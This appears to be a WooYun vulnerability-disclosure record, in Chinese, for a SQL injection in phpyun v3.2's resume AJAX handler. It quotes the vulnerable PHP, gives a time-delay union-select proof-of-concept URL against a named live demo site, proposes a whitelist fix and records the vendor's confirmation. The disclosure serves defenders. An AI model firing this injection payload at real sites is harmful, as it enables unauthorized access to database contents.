{"id": 41516, "wybug_id": "wooyun-2014-088544", "wybug_title": "phpyun v3.2 (20141222) 继续无限制注入一枚(demo测试)。", "wybug_corp": "php云人才系统", "wybug_author": "′雨。", "wybug_date": "2014-12-26 15:20", "wybug_open_date": "2015-03-26 15:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向公众公开  简要描述： 其他地方都限制了。。 唯独这里。直接出管理数据 无需盲注。 详细说明：  phpyun 在挺多地方都用到了$table　但是在其他地方直接定义了 或者用in_array 判断了post来的 在不在允许的范围里但是这里却遗漏了。member/user/model/resume.class.php中\nfunction resume_ajax_action(){        $this->select_resume('resume_'.$_POST['type'],$_POST['id']);\t}\n就两行,造成了注入 这里没对post来的type做限制啥的\nfunction select_resume($table,$id,$numresume=\"\")\t{\t\tinclude(PLUS_PATH.\"user.cache.php\");\t\t$info=$this->obj->DB_select_once($table,\"`id`='\".$id.\"'\");//这里直接把$table带入查询\t\t\t$info['skillval']=$userclass_name[$info['skill']];\t\t$info['ingval']=$userclass_name[$info['ing']];\t\t$info['sdate']=date(\"Y-m-d\",$info['sdate']);\t\tif($info['edate']>0){\t\t\t$info['edate']=date(\"Y-m-d\",$info['edate']);\t\t}else{\t\t\t$info['edate']='';\t\t\t$info['totoday']='1';\t\t}\t\t$info['numresume']=$numresume;\t\t\tif(is_array($info))\t\t{\t\t\tforeach($info as $k=>$v)\t\t\t{\t\t\t\t$arr[$k]=iconv(\"gbk\",\"utf-8\",$v);\t\t\t}\t\t}\t\techo json_encode($arr);die;//直接输出\t}\n绕过那个还是结合safekey不用考虑post的过滤   漏洞证明：  需要注册一个个人会员。\n\ndemo有安全狗 我就直接延时一下把。http://www.hr135.com/member/index.php/admin/?c=resume&act=resume_ajaxtype=cert where 1=1 union select sleep(5),2,3,4,5,6,7,8#&safekey=f213ae15d14ba9de59934fdf6e3eb70f明显发现延时了。。   修复方案：  限制传递来的 in_array   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-26 17:35 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}